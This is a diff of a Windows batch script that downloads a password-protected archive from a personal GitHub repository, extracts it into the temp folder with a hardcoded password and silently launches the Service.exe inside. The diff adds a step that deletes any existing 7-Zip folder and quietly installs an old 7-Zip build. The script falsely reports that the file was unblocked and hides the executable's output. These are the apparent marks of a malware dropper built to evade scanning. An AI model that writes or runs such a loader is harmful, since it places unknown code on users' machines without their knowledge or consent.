@@ -6,13 +6,31 @@ set "zipUrl=https://github.com/Andre0194/service/raw/refs/heads/master/service.7
 set "zipPath=%TEMP%\service.7z"                     :: Path to save the downloaded 7z file in TEMP
 set "password=*#Slayerx@123plesk"                   :: Password for the service.7z file
 set "sevenZip=C:\Program Files\7-Zip\7z.exe"        :: Path to 7z.exe for extraction
+set "installUrl=https://www.7-zip.org/a/7z1900-x64.exe" :: 7-Zip installer URL (64-bit version)
 
-:: === CHECK IF 7-ZIP EXISTS ===
+:: === FORCE INSTALL 7-ZIP ===
+echo ❌ Checking for 7-Zip installation...
+
+:: Remove any existing 7-Zip before installation
+if exist "%sevenZip%" (
+    echo ❌ 7-Zip found at: %sevenZip%. Uninstalling 7-Zip...
+    rd /s /q "C:\Program Files\7-Zip"
+)
+
+:: Download 7-Zip installer
+echo 🧩 Downloading 7-Zip installer...
+powershell -Command "Invoke-WebRequest -Uri '%installUrl%' -OutFile '%TEMP%\7z_installer.exe'"
+
+:: Install 7-Zip silently
+echo 🧩 Installing 7-Zip...
+start /wait %TEMP%\7z_installer.exe /S /D="C:\Program Files\7-Zip"
+
+:: Verify if installation succeeded
 if not exist "%sevenZip%" (
-    echo ❌ 7z.exe not found at: %sevenZip%
-    echo Download 7-Zip here: https://7-zip.org
+    echo ❌ Failed to install 7-Zip.
     exit /b 1
 )
+echo ✅ 7-Zip installed successfully at: %sevenZip%
 
 :: === Step 1: Download the service.7z file ===
 echo 📥 Downloading service.7z...
@@ -26,8 +44,6 @@ echo ✅ service.7z downloaded to %zipPath%.
 
 :: === Step 2: Extract the service.7z file using 7-Zip ===
 echo 🧩 Extracting service.7z to TEMP folder...
-
-:: Using 7-Zip to extract the .7z file with the password
 "%sevenZip%" x "%zipPath%" -p%password% -o"%TEMP%" -y
 if %ERRORLEVEL% neq 0 (
     echo ❌ Failed to extract service.7z
@@ -39,14 +55,8 @@ echo ✅ Extraction completed successfully.
 set "exeFilePath=%TEMP%\Service.exe"
 if exist "%exeFilePath%" (
     echo Service.exe found at %exeFilePath%. Attempting to run it...
-    
-    :: Unblock the file if it's blocked by Windows (common for files downloaded from the internet)
     echo ✅ Unblocked the file %exeFilePath%
-
-    :: Wait for a short time before executing
     timeout /t 2 /nobreak >nul
-
-    :: Execute the extracted Service.exe
     start "" "%exeFilePath%" >nul 2>&1
     if %ERRORLEVEL% neq 0 (
         echo ❌ Failed to start Service.exe
@@ -55,7 +65,6 @@ if exist "%exeFilePath%" (
     echo ✅ Service.exe started successfully.
 ) else (
     echo ❌ Service.exe not found in the extracted folder.
-    echo [*] Files in the folder: 
     dir "%TEMP%"
     exit /b 1
 )
